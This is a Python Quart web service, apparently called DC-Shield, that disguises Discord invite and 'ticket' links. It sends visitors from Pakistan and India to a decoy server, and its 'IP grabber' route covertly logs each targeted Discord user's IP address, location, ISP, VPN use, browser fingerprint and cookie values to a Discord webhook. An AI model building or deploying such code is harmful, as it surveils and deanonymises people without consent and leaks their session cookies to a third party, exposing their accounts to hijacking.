"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data. 
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import ipaddress
import requests
from datetime import datetime
from user_agents import parse
from logger import Logger
from json_handler import read_json_file, get_env_vars
from surveillance_embeds import create_combined_surveillance_embed, get_threat_indicator
from quart import Quart, jsonify, redirect, render_template, request, send_file

app = Quart(__name__)
l = Logger(console_log= True, file_logging=True, file_URI='logs/log1.txt', override=True)
default_server:str
alternative_server_url:str
test_flag:bool
redirected:bool
config:dict
sub_nets: list

def read_subnets_from_file(filename):
    global sub_nets
    """
    Read subnets from a text file.

    Parameters:
    filename (str): Name of the text file containing subnets.

    Returns:
    list: List of subnets in CIDR notation.
    """
    subnets = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if line:  # Skip empty lines
                    subnets.append(line)
        return subnets
    except FileNotFoundError:
        print("File not found.")
        return []

def ip_in_subnet(ip, subnet):
    """
    Check if an IP address belongs to a subnet.

    Parameters:
    ip (str): IP address.
    subnet (str): Subnet in CIDR notation.

    Returns:
    bool: True if IP address belongs to subnet, False otherwise.
    """
    if ip == None:
        return False
    try:
        ip_obj = ipaddress.ip_address(ip)
        subnet_obj = ipaddress.ip_network(subnet)
        return ip_obj in subnet_obj
    except ValueError as e:
        print("Error:", e)
        return False
    
def check_for_vpn(ip):
    global sub_nets
    return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)

def extract_device_info(request_obj):
    """
    Extract comprehensive device and browser information from the request.

    Args:
    - request_obj: The Quart request object

    Returns:
    - dict: Dictionary containing device information
    """
    headers = request_obj.headers

    # Extract the real IP address using the new function
    real_ip = extract_real_ip(request_obj)
    proxy_ip = headers.get('X-Real-IP', 'Unknown')
    # User Agent parsing
    user_agent_string = headers.get('User-Agent', 'Unknown')
    user_agent = parse(user_agent_string)

    # Extract cookies
    cookies = dict(request_obj.cookies) if request_obj.cookies else {}

    # Extract detailed information
    device_info = {
        'user_agent_string': user_agent_string,
        'browser_family': user_agent.browser.family,
        'browser_version': user_agent.browser.version_string,
        'os_family': user_agent.os.family,
        'os_version': user_agent.os.version_string,
        'device_family': user_agent.device.family,
        'device_brand': user_agent.device.brand,
        'device_model': user_agent.device.model,
        'is_mobile': user_agent.is_mobile,
        'is_tablet': user_agent.is_tablet,
        'is_pc': user_agent.is_pc,
        'is_bot': user_agent.is_bot,

        # IP Information - both real and proxy
        'real_ip': real_ip,
        'proxy_ip': proxy_ip,

        # HTTP Headers
        'accept_language': headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': headers.get('Accept-Encoding', 'Unknown'),
        'accept': headers.get('Accept', 'Unknown'),
        'referer': headers.get('Referer', 'Direct'),
        'host': headers.get('Host', 'Unknown'),
        'connection': headers.get('Connection', 'Unknown'),
        'cache_control': headers.get('Cache-Control', 'Unknown'),
        'upgrade_insecure_requests': headers.get('Upgrade-Insecure-Requests', 'Unknown'),
        'sec_fetch_site': headers.get('Sec-Fetch-Site', 'Unknown'),
        'sec_fetch_mode': headers.get('Sec-Fetch-Mode', 'Unknown'),
        'sec_fetch_dest': headers.get('Sec-Fetch-Dest', 'Unknown'),
        'sec_ch_ua': headers.get('Sec-CH-UA', 'Unknown'),
        'sec_ch_ua_mobile': headers.get('Sec-CH-UA-Mobile', 'Unknown'),
        'sec_ch_ua_platform': headers.get('Sec-CH-UA-Platform', 'Unknown'),
        'sec_ch_ua_platform_version': headers.get('Sec-CH-UA-Platform-Version', 'Unknown'),
        'sec_ch_ua_arch': headers.get('Sec-CH-UA-Arch', 'Unknown'),
        'sec_ch_ua_model': headers.get('Sec-CH-UA-Model', 'Unknown'),
        'sec_ch_ua_bitness': headers.get('Sec-CH-UA-Bitness', 'Unknown'),
        'sec_ch_ua_wow64': headers.get('Sec-CH-UA-WoW64', 'Unknown'),
        'sec_ch_ua_full_version_list': headers.get('Sec-CH-UA-Full-Version-List', 'Unknown'),
        'sec_ch_viewport_width': headers.get('Sec-CH-Viewport-Width', 'Unknown'),
        'sec_ch_viewport_height': headers.get('Sec-CH-Viewport-Height', 'Unknown'),
        'sec_ch_dpr': headers.get('Sec-CH-DPR', 'Unknown'),
        'sec_ch_device_memory': headers.get('Sec-CH-Device-Memory', 'Unknown'),
        'sec_ch_downlink': headers.get('Sec-CH-Downlink', 'Unknown'),
        'sec_ch_ect': headers.get('Sec-CH-ECT', 'Unknown'),
        'sec_ch_rtt': headers.get('Sec-CH-RTT', 'Unknown'),
        'sec_ch_save_data': headers.get('Sec-CH-Save-Data', 'Unknown'),
        'sec_ch_prefers_color_scheme': headers.get('Sec-CH-Prefers-Color-Scheme', 'Unknown'),
        'sec_ch_prefers_reduced_motion': headers.get('Sec-CH-Prefers-Reduced-Motion', 'Unknown'),

        # Additional network info
        'x_forwarded_for': headers.get('X-Forwarded-For', 'Unknown'),
        'x_real_ip': headers.get('X-Real-IP', 'Unknown'),
        'cf_connecting_ip': headers.get('CF-Connecting-IP', 'Unknown'),
        'cf_ipcountry': headers.get('CF-IPCountry', 'Unknown'),
        'cf_ray': headers.get('CF-Ray', 'Unknown'),
        'cf_visitor': headers.get('CF-Visitor', 'Unknown'),
        'x_forwarded_proto': headers.get('X-Forwarded-Proto', 'Unknown'),
        'x_forwarded_port': headers.get('X-Forwarded-Port', 'Unknown'),

        # Browser fingerprinting headers
        'dnt': headers.get('DNT', 'Unknown'),  # Do Not Track
        'pragma': headers.get('Pragma', 'Unknown'),
        'if_modified_since': headers.get('If-Modified-Since', 'Unknown'),
        'if_none_match': headers.get('If-None-Match', 'Unknown'),
        'te': headers.get('TE', 'Unknown'),  # Transfer encoding
        'authorization': 'REDACTED' if headers.get('Authorization') else 'None',

        # Cookies and session data
        'cookies': cookies,
        'cookie_count': len(cookies),
        'has_session_cookies': any('session' in k.lower() or 'auth' in k.lower() or 'token' in k.lower() for k in cookies.keys()),
        'has_tracking_cookies': any('ga' in k.lower() or 'gtm' in k.lower() or 'fb' in k.lower() or '_utm' in k.lower() or 'analytics' in k.lower() for k in cookies.keys()),

        # Request metadata
        'method': request_obj.method,
        'scheme': request_obj.scheme,
        'path': request_obj.path,
        'query_string': request_obj.query_string.decode('utf-8') if request_obj.query_string else '',
        'content_type': request_obj.content_type or 'Unknown',
        'content_length': headers.get('Content-Length', 'Unknown'),

        # Timestamp with better formatting
        'access_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
        'access_timestamp': datetime.now().timestamp()
    }

    return device_info

def send_to_channel(message: str, embed_data=None, components=None):
    """Enhanced webhook sender with better error handling"""
    global config
    
    payload = {}

    # Build payload more safely
    if embed_data:
        payload["embeds"] = [embed_data]
        if message:
            payload["content"] = message
        # Note: Webhooks don't support components/buttons
        if components:
            l.warning("Webhooks don't support interactive components - buttons ignored")
    else:
        payload["content"] = message or "No message content"

    try:
        response = requests.post(
            config["dc_webhook_url"],
            json=payload,
            timeout=10  # Add timeout
        )
        response.raise_for_status()

        if response.status_code == 204:
            l.passing("Message sent successfully")
            return True
        else:
            l.error(f"Unexpected status code: {response.status_code}")
            return False

    except requests.exceptions.Timeout:
        l.error("Webhook request timed out")
        return False
    except requests.exceptions.RequestException as e:
        l.error(f"Webhook request failed: {e}")
        return False

def create_honeypot_embed(ip, country_code, honeypot, device_info=None):
    """
    Create an enhanced Discord embed for honeypot triggers with improved visuals
    """
    from surveillance_embeds import get_threat_indicator, create_progress_bar

    # Calculate threat score based on honeypot trigger
    threat_score = 75  # Honeypot triggers are high risk
    threat_level, embed_color = get_threat_indicator(threat_score)

    # Fix IP address display - use fallback if None
    display_ip = ip if ip and ip != "None" else "127.0.0.1 (localhost)"

    embed = {
        "title": "🚨 HONEYPOT SECURITY BREACH",
        "description": f"**{threat_level} THREAT DETECTED**\n🎯 **Malicious actor intercepted from {country_code}**",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/454652220064006147.gif"
        },
        "fields": [],
        "footer": {
            "text": f"DC-Shield Honeypot Defense System • Threat Level: {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
        }
    }

    # Enhanced Network Intelligence
    network_value = f"**IP Address:** `{display_ip}`\n"
    network_value += f"**Country Code:** {country_code}\n"
    network_value += f"**Threat Assessment:** {threat_level}\n"
    network_value += f"**Risk Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append({
        "name": "🌐 NETWORK INTELLIGENCE",
        "value": network_value,
        "inline": False
    })

    # Honeypot Information
    honeypot_value = f"**Decoy Server:** `{honeypot}`\n"
    honeypot_value += "**Redirect Status:** ✅ Successfully executed\n"
    honeypot_value += f"**Analysis:** [View IP Details](https://iplocation.com/?ip={display_ip.replace(' (localhost)', '')})"

    embed["fields"].append({
        "name": "🍯 HONEYPOT DETAILS",
        "value": honeypot_value,
        "inline": False
    })

    if device_info:
        # Enhanced Device Profile
        device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
        device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
        device_value += f"**Device Type:** {device_info['device_family']}"

        if device_info['device_brand'] and device_info['device_brand'] != 'None':
            device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

        device_type_map = {
            'is_mobile': ("📱", "Mobile"),
            'is_pc': ("💻", "Desktop"),
            'is_tablet': ("📟", "Tablet"),
            'is_bot': ("🤖", "Bot"),
        }
        device_type_emoji, device_type_text = ("❓", "Unknown")
        for key, (emoji, text) in device_type_map.items():
            if device_info[key]:
                device_type_emoji, device_type_text = emoji, text
                break

        device_value += f"\n**Platform:** {device_type_emoji} {device_type_text}"

        embed["fields"].append({
            "name": "📱 DEVICE FINGERPRINT",
            "value": device_value,
            "inline": True
        })

        # Connection Intelligence with better timestamp formatting
        connection_value = f"**Language Settings:** {device_info['accept_language'][:25]}...\n"
        connection_value += f"**Referrer Source:** {device_info['referer'][:40]}...\n"

        # Format timestamp better
        try:
            access_dt = datetime.fromisoformat(device_info['access_time'].replace('Z', '+00:00'))
            formatted_time = access_dt.strftime("%Y-%m-%d %H:%M:%S UTC")
        except ValueError:
            formatted_time = device_info['access_time']

        connection_value += f"**Access Time:** {formatted_time}\n"
        connection_value += f"**User Agent:** {device_info['user_agent_string'][:50]}..."

        embed["fields"].append({
            "name": "🌍 CONNECTION ANALYSIS",
            "value": connection_value,
            "inline": True
        })

        # Security Indicators
        security_indicators = []
        if device_info['has_session_cookies']:
            security_indicators.append("⚠️ Session cookies present")
        if device_info['has_tracking_cookies']:
            security_indicators.append("⚠️ Tracking cookies detected")
        if device_info['is_bot']:
            security_indicators.append("🤖 Bot-like behavior")
        if not security_indicators:
            security_indicators.append("✅ No obvious red flags")

        embed["fields"].append({
            "name": "🔍 SECURITY INDICATORS",
            "value": "\n".join(security_indicators),
            "inline": False
        })

    return embed

def create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info):
    """
    Create an enhanced Discord embed for IP grabber triggers with comprehensive analysis
    """
    from surveillance_embeds import get_threat_indicator, create_progress_bar

    # Calculate threat score based on various factors
    threat_score = 45  # Base score for IP grabbing
    if vpn:
        threat_score += 20  # VPN usage increases suspicion
    if device_info.get('has_tracking_cookies'):
        threat_score += 10
    if device_info.get('is_bot'):
        threat_score += 15

    threat_score = min(threat_score, 100)
    threat_level, embed_color = get_threat_indicator(threat_score)

    embed = {
        "title": "🎯 ADVANCED IP INTELLIGENCE CAPTURE",
        "description": f"**{threat_level} TARGET ANALYSIS**\n📊 **Complete digital profile acquired for: `{dc_handle}`**",
        "color": embed_color,
        "timestamp": datetime.now().isoformat(),
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/target.png"
        },
        "fields": [],
        "footer": {
            "text": f"DC-Shield IP Intelligence System • Threat Score: {threat_score}/100",
            "icon_url": "https://cdn.discordapp.com/emojis/globe.png"
        }
    }

    # Enhanced Target Profile
    target_value = f"**Discord Handle:** `{dc_handle}`\n"
    target_value += f"**VPN Detection:** {'🔒 Active VPN detected' if vpn else '❌ No VPN protection'}\n"
    target_value += f"**Risk Assessment:** {threat_level}\n"
    target_value += f"**Threat Score:** {create_progress_bar(threat_score)}"

    embed["fields"].append({
        "name": "👤 TARGET PROFILE",
        "value": target_value,
        "inline": False
    })

    # Geographic Intelligence
    geo_value = f"**IP Address:** `{ip_address}`\n"
    geo_value += f"**Country:** {country_name} ({country_code2})\n"
    geo_value += f"**ISP Provider:** {isp}\n"
    geo_value += f"**Analysis Link:** [Detailed Lookup](https://iplocation.com/?ip={ip_address})"

    embed["fields"].append({
        "name": "🌍 GEOGRAPHIC INTELLIGENCE",
        "value": geo_value,
        "inline": True
    })

    # Enhanced Device Analysis
    device_value = f"**Browser:** {device_info['browser_family']} {device_info['browser_version']}\n"
    device_value += f"**Operating System:** {device_info['os_family']} {device_info['os_version']}\n"
    device_value += f"**Hardware:** {device_info['device_family']}"

    if device_info['device_brand'] and device_info['device_brand'] != 'None':
        device_value += f" ({device_info['device_brand']} {device_info['device_model']})"

    platform_icons = {
        'mobile': '📱', 'tablet': '📟', 'pc': '💻', 'bot': '🤖'
    }

    platform_type = 'unknown'
    if device_info['is_mobile']:
        platform_type = 'mobile'
    elif device_info['is_tablet']:
        platform_type = 'tablet'
    elif device_info['is_pc']:
        platform_type = 'pc'
    elif device_info['is_bot']:
        platform_type = 'bot'

    platform_emoji = platform_icons.get(platform_type, '❓')
    device_value += f"\n**Platform:** {platform_emoji} {platform_type.title()}"

    embed["fields"].append({
        "name": "📱 DEVICE ANALYSIS",
        "value": device_value,
        "inline": True
    })

    # Privacy & Security Analysis
    privacy_concerns = []
    privacy_score = 0

    if device_info['cookie_count'] > 0:
        privacy_concerns.append(f"🍪 **Cookies:** {device_info['cookie_count']} detected")
        privacy_score += min(device_info['cookie_count'] * 2, 20)

    if device_info['has_session_cookies']:
        privacy_concerns.append("⚠️ **Session Data:** Active sessions found")
        privacy_score += 15

    if device_info['has_tracking_cookies']:
        privacy_concerns.append("⚠️ **Tracking:** Analytics cookies present")
        privacy_score += 10

    if device_info.get('dnt') == '1':
        privacy_concerns.append("✅ **Do Not Track:** Enabled")
    else:
        privacy_concerns.append("❌ **Do Not Track:** Disabled")
        privacy_score += 5

    if privacy_score >= 30:
        privacy_level = "🔴 High Risk"
    elif privacy_score >= 15:
        privacy_level = "🟡 Moderate Risk"
    else:
        privacy_level = "🟢 Low Risk"

    embed["fields"].append({
        "name": f"🔒 PRIVACY ANALYSIS ({privacy_level})",
        "value": "\n".join(privacy_concerns),
        "inline": False
    })

    # Technical Specifications
    tech_specs = []

    if device_info.get('sec_ch_device_memory', 'Unknown') != 'Unknown':
        tech_specs.append(f"**RAM:** {device_info['sec_ch_device_memory']} GB")

    if device_info.get('sec_ch_ua_arch', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Architecture:** {device_info['sec_ch_ua_arch']}")

    if device_info.get('sec_ch_dpr', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Display DPR:** {device_info['sec_ch_dpr']}")

    if device_info.get('sec_ch_downlink', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Network Speed:** {device_info['sec_ch_downlink']} Mbps")

    if device_info.get('sec_ch_rtt', 'Unknown') != 'Unknown':
        tech_specs.append(f"**Network Latency:** {device_info['sec_ch_rtt']}ms")

    if tech_specs:
        embed["fields"].append({
            "name": "⚙️ Technical Specifications",
            "value": "\n".join(tech_specs),
            "inline": True
        })

    return embed

def extract_real_ip(request_obj):
    """
    Extract the real client IP address when running behind nginx proxy manager.

    Args:
    - request_obj: The Quart request object

    Returns:
    - str: The real client IP address
    """
    headers = request_obj.headers

    # Check X-Forwarded-For header first (contains real client IP)
    x_forwarded_for = headers.get('X-Forwarded-For')
    if x_forwarded_for:
        # Handle comma-separated IPs (take the first one - the original client)
        real_ip = x_forwarded_for.split(',')[0].strip()
        if is_valid_ip(real_ip):
            return real_ip

    # Fall back to X-Real-IP header
    x_real_ip = headers.get('X-Real-IP')
    if x_real_ip and is_valid_ip(x_real_ip):
        return x_real_ip

    # Check CF-Connecting-IP (Cloudflare)
    cf_ip = headers.get('CF-Connecting-IP')
    if cf_ip and is_valid_ip(cf_ip):
        return cf_ip

    # Fall back to request.remote_addr as last resort
    remote_addr = getattr(request_obj, 'remote_addr', None)
    if remote_addr and is_valid_ip(remote_addr):
        return remote_addr

    # If all else fails, return None
    return None

def is_valid_ip(ip_string):
    """
    Validate if a string is a valid IP address.

    Args:
    - ip_string: String to validate

    Returns:
    - bool: True if valid IP, False otherwise
    """
    if not ip_string:
        return False

    try:
        ipaddress.ip_address(ip_string)
        return True
    except ValueError:
        return False



def create_verbose_embed(device_info, event_type="IP_GRABBER"):
    """
    Create a verbose embed with all detailed information.
    """
    embed = {
        "title": f"📋 VERBOSE {event_type} DETAILS",
        "description": "Complete device and network fingerprint analysis",
        "color": 0x2f3542,  # Dark gray color
        "timestamp": datetime.now().isoformat(),
        "fields": [],
        "footer": {
            "text": "DC-Shield Detailed Analysis System",
            "icon_url": "https://cdn.discordapp.com/emojis/658997002100670484.png"
        }
    }

    # Browser Details
    browser_details = f"**Family:** {device_info['browser_family']}\n"
    browser_details += f"**Version:** {device_info['browser_version']}\n"
    browser_details += f"**User Agent:** {device_info['user_agent_string'][:100]}..."

    embed["fields"].append({
        "name": "🌐 Browser Details",
        "value": browser_details,
        "inline": False
    })

    # Operating System
    os_details = f"**Family:** {device_info['os_family']}\n"
    os_details += f"**Version:** {device_info['os_version']}\n"
    if device_info['sec_ch_ua_platform'] != 'Unknown':
        os_details += f"**Platform:** {device_info['sec_ch_ua_platform']}\n"
    if device_info['sec_ch_ua_platform_version'] != 'Unknown':
        os_details += f"**Platform Version:** {device_info['sec_ch_ua_platform_version']}"

    embed["fields"].append({
        "name": "💻 Operating System",
        "value": os_details,
        "inline": True
    })

    # Hardware Specifications
    hardware_specs = ""
    if device_info['sec_ch_device_memory'] != 'Unknown':
        hardware_specs += f"**RAM:** {device_info['sec_ch_device_memory']} GB\n"
    if device_info['sec_ch_ua_arch'] != 'Unknown':
        hardware_specs += f"**Architecture:** {device_info['sec_ch_ua_arch']}\n"
    if device_info['sec_ch_ua_bitness'] != 'Unknown':
        hardware_specs += f"**Bitness:** {device_info['sec_ch_ua_bitness']}-bit\n"
    if device_info['sec_ch_ua_wow64'] != 'Unknown':
        hardware_specs += f"**WoW64:** {device_info['sec_ch_ua_wow64']}\n"
    if device_info['sec_ch_dpr'] != 'Unknown':
        hardware_specs += f"**Device Pixel Ratio:** {device_info['sec_ch_dpr']}"

    if hardware_specs:
        embed["fields"].append({
            "name": "⚙️ Hardware Specifications",
            "value": hardware_specs,
            "inline": True
        })

    # Network Information
    network_info = f"**Accept-Language:** {device_info['accept_language']}\n"
    network_info += f"**Accept-Encoding:** {device_info['accept_encoding']}\n"
    if device_info['sec_ch_downlink'] != 'Unknown':
        network_info += f"**Download Speed:** {device_info['sec_ch_downlink']} Mbps\n"
    if device_info['sec_ch_rtt'] != 'Unknown':
        network_info += f"**Round Trip Time:** {device_info['sec_ch_rtt']}ms\n"
    if device_info['sec_ch_ect'] != 'Unknown':
        network_info += f"**Effective Connection Type:** {device_info['sec_ch_ect']}"

    embed["fields"].append({
        "name": "🌍 Network Information",
        "value": network_info,
        "inline": False
    })

    # Cookie Analysis
    if device_info['cookie_count'] > 0:
        cookie_analysis = f"**Total Count:** {device_info['cookie_count']}\n"
        cookie_analysis += f"**Has Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n"
        cookie_analysis += f"**Has Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}\n"

        # List first few cookies
        if device_info['cookies']:
            cookie_analysis += "**Sample Cookies:**\n"
            for i, (name, value) in enumerate(list(device_info['cookies'].items())[:3]):
                cookie_analysis += f"• `{name}`: {value[:30]}...\n"
            if len(device_info['cookies']) > 3:
                cookie_analysis += f"• ... and {len(device_info['cookies']) - 3} more"

        embed["fields"].append({
            "name": "🍪 Cookie Analysis",
            "value": cookie_analysis,
            "inline": True
        })

    # Privacy & Security Headers
    privacy_info = ""
    if device_info['dnt'] != 'Unknown':
        privacy_info += f"**Do Not Track:** {device_info['dnt']}\n"
    if device_info['sec_ch_prefers_color_scheme'] != 'Unknown':
        privacy_info += f"**Color Scheme:** {device_info['sec_ch_prefers_color_scheme']}\n"
    if device_info['sec_ch_prefers_reduced_motion'] != 'Unknown':
        privacy_info += f"**Reduced Motion:** {device_info['sec_ch_prefers_reduced_motion']}\n"
    if device_info['sec_ch_save_data'] != 'Unknown':
        privacy_info += f"**Save Data:** {device_info['sec_ch_save_data']}"

    if privacy_info:
        embed["fields"].append({
            "name": "🔒 Privacy & Preferences",
            "value": privacy_info,
            "inline": True
        })

    # Screen & Viewport
    if device_info['sec_ch_viewport_width'] != 'Unknown' or device_info['sec_ch_viewport_height'] != 'Unknown':
        viewport_info = ""
        if device_info['sec_ch_viewport_width'] != 'Unknown':
            viewport_info += f"**Width:** {device_info['sec_ch_viewport_width']}px\n"
        if device_info['sec_ch_viewport_height'] != 'Unknown':
            viewport_info += f"**Height:** {device_info['sec_ch_viewport_height']}px\n"
        if device_info['sec_ch_dpr'] != 'Unknown':
            viewport_info += f"**Pixel Ratio:** {device_info['sec_ch_dpr']}"

        embed["fields"].append({
            "name": "📱 Screen & Viewport",
            "value": viewport_info,
            "inline": True
        })

    # Request Metadata
    metadata = f"**Method:** {device_info['method']}\n"
    metadata += f"**Scheme:** {device_info['scheme']}\n"
    metadata += f"**Path:** {device_info['path']}\n"
    if device_info['query_string']:
        metadata += f"**Query:** {device_info['query_string'][:50]}...\n"
    metadata += f"**Content Type:** {device_info['content_type']}"

    embed["fields"].append({
        "name": "📄 Request Metadata",
        "value": metadata,
        "inline": False
    })

    return embed

# Global storage for device information (in production, use a database)
device_data_store = {}
advanced_data_store = {}
COMPREHENSIVE_REPORT_MESSAGE = "🚨 **COMPREHENSIVE SURVEILLANCE REPORT** 🚨"

@app.route('/api/collect-advanced-data', methods=['POST'])
async def collect_advanced_data():
    """
    API endpoint to receive advanced browser data collection
    """
    try:
        data = await request.get_json()

        # Store the advanced data
        timestamp = str(data.get('timestamp', int(datetime.now().timestamp())))
        advanced_data_store[timestamp] = data

        l.info(f'Advanced data collected: {len(data.get("data", {}))} categories')

        # Send advanced data to Discord
        send_advanced_data_to_discord(data)

        return jsonify({"status": "success"}), 200

    except Exception as e:
        l.error(f'Error collecting advanced data: {e}')
        return jsonify({"status": "error", "message": str(e)}), 500

def send_advanced_data_to_discord(collected_data):
    """
    Send combined advanced collected data to Discord without buttons (webhooks don't support them)
    """
    try:
        # Handle both dictionary and list data structures
        if isinstance(collected_data, dict):
            data = collected_data.get('data', {})
        else:
            # Fallback: treat as the data directly
            data = collected_data if collected_data else {}

        # Create comprehensive combined embed with all data
        embed = create_combined_surveillance_embed(data)

        # Send embed without buttons since webhooks don't support interactive components
        send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)

    except Exception as e:
        l.error(f'Error sending advanced data to Discord: {e}')
        # Send without components as fallback
        try:
            # Use safer data extraction for fallback
            if isinstance(collected_data, dict):
                fallback_data = collected_data.get('data', {})
            else:
                fallback_data = collected_data if collected_data else {}

            embed = create_combined_surveillance_embed(fallback_data)
            send_to_channel(COMPREHENSIVE_REPORT_MESSAGE, embed)
        except Exception as fallback_error:
            l.error(f'Fallback also failed: {fallback_error}')

def get_country(ip_address):
    """Retrieve country information for the given IP address."""
    try:
        response = request_ip_location(ip_address)
        if response and response.get("response_code") == "200":
            country_code = response.get("country_code2")
            return country_code
    except Exception as e:
        l.error(f"Error fetching country information: {e}")
    return None

def request_ip_location(ip_address):
    """Make a request to the IP location API."""
    url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        l.error(f"Error fetching IP location: {e}")
    return None

async def redirect_handler(ip, normal_server, honeypot, request_obj=None):
    global redirected

    # Extract real IP if request object is provided
    real_ip = ip  # Default fallback
    if request_obj:
        extracted_real_ip = extract_real_ip(request_obj)
        if extracted_real_ip:
            real_ip = extracted_real_ip
            l.info(f'Real IP extracted: {real_ip} (original: {ip})')
        else:
            l.info(f'Could not extract real IP, using: {ip}')

    # Use real IP for geolocation
    country_code = get_country(real_ip)
    l.info(f'Country code for {real_ip}: {country_code}')

    #if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = 'PK'
            l.info(f'Test flag, changed country code: {country_code}')
        else:
            l.info('Test flag, not changing country code')
        redirected = not redirected
        
    if country_code and country_code in ['PK', 'IN']:
        l.info(f"Redirecting to Honeypot: {honeypot}")

        # Initialize device_info to None first
        device_info = None

        # Extract device information if request object is provided
        if request_obj:
            device_info = extract_device_info(request_obj)
            l.info(f'Honeypot device info: {device_info}')

        # Create and send embed message - use real IP for display
        embed = create_honeypot_embed(real_ip, country_code, honeypot, device_info)
        send_to_channel("", embed)

        return redirect(honeypot)
    elif check_for_vpn(real_ip):
        return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
    
    else:
        l.info(f"Redirecting to: {normal_server}")
        return redirect(normal_server)

@app.route('/')
async def index():
    l.info('Default route called.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        return await redirect_handler(ip_address, default_server, alternative_server_url, request)
    except Exception as e:
        l.error(f'{e}')
        
@app.route('/health')
async def health():
    l.info('Health route called.')
    return 200
        
@app.route('/ticket/<path:dc_handle>')
async def ip_grab(dc_handle):
    l.info('Grabber called.')
    l.info(f'user is: {dc_handle}')

    # Use the new real IP extraction method
    real_ip = extract_real_ip(request)
    ip_address = real_ip if real_ip else request.headers.get('X-Real-IP', '127.0.0.1')

    l.info(f'IP Address is: {ip_address}')
    vpn = check_for_vpn(ip_address)

    # Extract comprehensive device information
    device_info = extract_device_info(request)

    try:
        data = request_ip_location(ip_address)
        ip_number = data['ip_number']
        ip_version = data['ip_version']
        country_name = data['country_name']
        country_code2 = data['country_code2']
        isp = data['isp']

        l.info(f'IP data: {data}\nVPN: {vpn}')
        l.info(f'Device info: {device_info}')

        # Create and send embed message with button
        event_id = str(int(datetime.now().timestamp()))
        device_data_store[event_id] = device_info

        # Only send embed if we have valid IP data
        if data.get('response_code') == '200':
            embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)
            # Send initial summary embed
            send_to_channel("", embed)

            # Send verbose embed as follow-up message
            verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
            send_to_channel("📋 **Detailed Analysis:**", verbose_embed)
        else:
            l.warning(f'Invalid IP data received: {data}')

        if vpn:
            return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'

        dc_handle += '?'
        return await render_template('result.html',
                                   dc_handle=dc_handle,
                                   ip=ip_address,  # Use the extracted IP
                                   ip_number=ip_number,
                                   ip_version=ip_version,
                                   country_name=country_name,
                                   country_code2=country_code2,
                                   isp=isp,
                                   device_info=device_info)
    except Exception as e:
        l.error(f'{e}')
        # Fallback to basic template with available data
        return await render_template('result.html',
                                   dc_handle=dc_handle + '?',
                                   ip=ip_address,
                                   ip_number='Unknown',
                                   ip_version='4',
                                   country_name='Unknown',
                                   country_code2='XX',
                                   isp='Unknown',
                                   device_info=device_info)

@app.route('/<path:dc_invite>')
async def refer(dc_invite):
    l.info('Custom route called.')
    l.info(f'Route is: {dc_invite}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    custom_server = f'https://discord.gg/{dc_invite}'
    try:
        return await redirect_handler(ip_address, custom_server, alternative_server_url, request)
    except Exception as e:
            l.error(f'{e}')
    
@app.route('/<path:dc_invite>/<path:honeypot>')
async def refer_custom(dc_invite, honeypot):
    l.info('Custom route called with custom honeypot.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    l.info(f'Route is: {dc_invite}/{honeypot}')
    custom_server = f'https://discord.gg/{dc_invite}'
    custom_honeypot = f'https://discord.gg/{honeypot}'
    try:
        return await redirect_handler(ip_address, custom_server, custom_honeypot, request)
    except Exception as e:
            l.error(f'{e}')

# Route for serving favicon.ico
@app.route('/favicon.ico')
async def favicon():
    return await send_file('favicon.ico')


if __name__ == '__main__':
    
    try:
        config = read_json_file('config.json')
    except FileNotFoundError as e:
        l.error(e)
        l.passing('Trying to gather config from env vars')
        config = get_env_vars()
        l.console_log(config)
    sub_nets = read_subnets_from_file('ipv4.txt') # txt file courtesy of https://github.com/X4BNet/lists_vpn
    test_flag = config['test_flag']
    redirected = False
    if test_flag:
        l.passing('Test flag is set, every second request will be directed to the honey pot')
    default_server = config['default_server']

    alternative_server_url = config['honeypot_server']
    
    app_port = int(config['app_port'])
    
    
    app.run(host='0.0.0.0',port = app_port)